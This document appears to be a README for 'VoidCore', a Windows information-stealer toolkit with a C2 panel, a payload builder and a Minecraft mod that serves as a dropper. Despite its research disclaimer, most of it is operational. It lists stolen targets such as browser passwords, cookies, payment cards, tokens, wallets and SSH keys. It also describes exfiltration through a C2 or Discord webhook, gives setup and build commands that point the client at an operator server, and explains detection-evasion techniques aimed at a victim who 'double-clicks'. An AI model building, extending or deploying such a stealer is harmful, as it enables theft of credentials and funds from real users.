<div align="center">

<img src="https://voidc.duckdns.org/logo.webp" width="120" alt="VoidCore">

# VoidCore

### Windows information-stealer research suite — client, C2 panel, builder, and Minecraft delivery channel

[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
[![Platform: Windows](https://img.shields.io/badge/platform-Windows-0078D4.svg)]()
[![Python](https://img.shields.io/badge/python-3.12-3776AB.svg)]()
[![Java](https://img.shields.io/badge/java-25-ED8B00.svg)]()

</div>

---

> **Authorized security research only.**
> Run the client solely on systems you own or are explicitly paid to assess, in an isolated environment. Unauthorized use against any machine you do not control is illegal and is entirely your responsibility.

## Overview

**VoidCore** is a complete offensive-security research toolkit for studying the
Windows information-stealer malware class. It exists so that red teamers,
detection engineers, and students can observe the full attack chain —
collection, encryption, exfiltration, and delivery — on lab systems they
control, and build detections that stop it.

The suite covers four components, each usable independently:

| Component | Purpose |
|---|---|
| **Collection client** | Pure-Python Windows stealer; the full capability surface |
| **C2 panel** | Loot intake, sealed payload hosting, pinned-TLS mod channel |
| **Builder (Forge)** | Browser-based build service producing sealed, configured payloads |
| **BlackHole mod** | Fabric mod that acts as the delivery channel — Minecraft itself becomes the dropper |

## Repository layout

```
stealer/                   collection client + C2 panel + staged loader
├── stealer_client.py      full client, every capability documented inline
├── c2_server.py           panel: intake, mod channel, payload hosting
├── bh_loader.py           minimal staged TLS loader
└── build_exe.bat          one-command Windows build

forge/                     browser-based builder
├── app.py                 Flask backend, operator-token gated
├── static/index.html      builder UI
└── templates/             build templates (config injected at forge time)

mod/                       BlackHole — Fabric mod (MC 26.2, Loader 0.19.5)
└── src/                   pinned-TLS check-in, staged payload fetch and run
```

## Capabilities

### Collection surface

| Target | Method |
|---|---|
| Chromium — passwords, cookies, payment cards, history, bookmarks | DPAPI + App-Bound Encryption bypass |
| Chromium — ABE-resistant tokens | hidden remote-debugging pass + [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) (MIT) |
| Firefox — logins, cookies, history | readable-at-rest stores |
| Discord tokens | leveldb scrape |
| Telegram / Steam / Roblox | session files |
| Minecraft — **19 launchers** | see below |
| Desktop wallets (7) / Web3 extensions | file and vault presence |
| SSH keys / system info / screenshot | direct read |

### Minecraft launcher sweep

`steal_minecraft` covers vanilla plus PrismLauncher (with a recursive walk of
the instances tree), TLauncher, ATLauncher, CurseForge, GDLauncher, Modrinth,
Feather, Lunar, Badlion, Essentials, and the client data directories of
Meteor, Impact, Inertia, Rush, Salhack, Future, and Dancing.

Named account files are read first; a recursive glob then catches anything
account-, session-, token-, or credential-shaped up to four directory levels
deep — so launchers storing credentials in non-standard paths still get caught.

## Exfiltration

Two independent modes, selected at build time:

**C2 panel** — loot is compressed, AES-256-GCM sealed, and lands in the panel
for review.

**Discord webhook** — the complete loot set ships as a **single downloadable
JSON file**: a summary and credential preview in the message body, the full
dataset attached. No chunked base64, no channel spam. In this mode the victim
identity is hashed before anything reaches Discord, and `sysinfo` and
screenshot data are stripped entirely — the operator sees what was collected,
not whose machine it came from.

Both paths honor Discord's rate limits and set a browser User-Agent; the
default `python-urllib` agent is filtered by Cloudflare (error 1010).

## Getting started

### Panel

```bash
pip install flask pycryptodome
sudo python3 stealer/c2_server.py --port 443
```

### Client

```python
# stealer_client.py — point at your panel
CANDIDATES = ["<your-server>:443"]   # tried in order, first live host wins
```

Optional resilient resolution via `DEADDROP_CONTRACT` (Polygon) or
`DEADDROP_DOMAIN` (DNS TXT over DoH) — see [`HOW_IT_WORKS.md`](HOW_IT_WORKS.md).

```bat
pip install pyinstaller pycryptodome pillow
pyinstaller --onefile --noconsole --name vw_client ^
  --add-binary chromelevator_x64.exe:. stealer_client.py
```

No console, no arguments, no elevation required — the victim double-clicks.

### Builder

A Flask service producing sealed builds from a browser: paste a C2 address or
Discord webhook, choose Python or JAR, toggle encryption, forge. Each build's
config is sealed with a per-build random key and is never persisted — no
database, no user accounts, nothing survives the request.

```bash
FORGE_TOKEN=<random> python3 forge/app.py
```

The JAR tab produces a ~12 KB staged mod that pulls its payload from the panel
at runtime. Nothing large or sensitive is embedded in the artifact, which
keeps it small and avoids static-detection heuristics.

### BlackHole mod

A Fabric mod for Minecraft 26.2 that checks in over a pinned-TLS connection,
fetches the payload from the panel, and executes it. Minecraft becomes the
dropper — no separate download step, no user interaction beyond launching the
game.

Obfuscated with ProGuard (classes repackaged to `bh/`, string constants
XOR-folded in a vault). Java 25 verification requires StackMapTable frames, so
`-dontpreverify` **must not** be used — omitting it causes an immediate
`VerifyError` at class load.

## Documentation

- [`HOW_IT_WORKS.md`](HOW_IT_WORKS.md) — technique deep-dive
- [`SETUP_WINDOWS.md`](SETUP_WINDOWS.md) — lab environment setup, including Defender exclusions for testing on your own box
- [`SECURITY.md`](SECURITY.md) — responsible disclosure and scope

## Defensive use

Every technique in this suite has a corresponding detection opportunity. The
documentation calls out where each collection method touches the filesystem,
the registry, or DPAPI — the exact telemetry a detection engineer needs to
write a rule. This project is published for that purpose.

## Legal and ethical stance

This is offensive security research tooling, published for people testing
detection coverage and studying stealer tradecraft on systems they own or are
paid to assess. The authors do not condone use against any machine without
explicit authorization, and provide no support for such activity.

## License

MIT — research and education. See [LICENSE](LICENSE).
